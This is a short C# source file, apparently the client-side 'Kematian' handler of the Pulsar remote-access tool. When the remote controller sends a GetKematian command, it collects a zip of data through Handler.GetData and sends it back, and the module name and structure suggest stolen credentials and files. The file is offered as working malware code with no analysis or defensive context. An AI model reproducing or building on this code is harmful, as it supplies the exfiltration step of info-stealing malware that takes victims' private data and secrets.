using Pulsar.Common.Messages;
using Pulsar.Common.Networking;
using Pulsar.Client.Kematian;
using Pulsar.Common.Messages.Monitoring.Kematian;
using Pulsar.Common.Messages.other;
using ProtoBuf;

namespace Pulsar.Client.Messages
{
    public class KematianHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is GetKematian;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKematian msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetKematian message)
        {
            int defaultTimeout = 120; //after 2 minutes all hope is lost :sob:
            byte[] zipFile = Handler.GetData(defaultTimeout);
            client.Send(new GetKematian { ZipFile = zipFile });
        }
    }
}
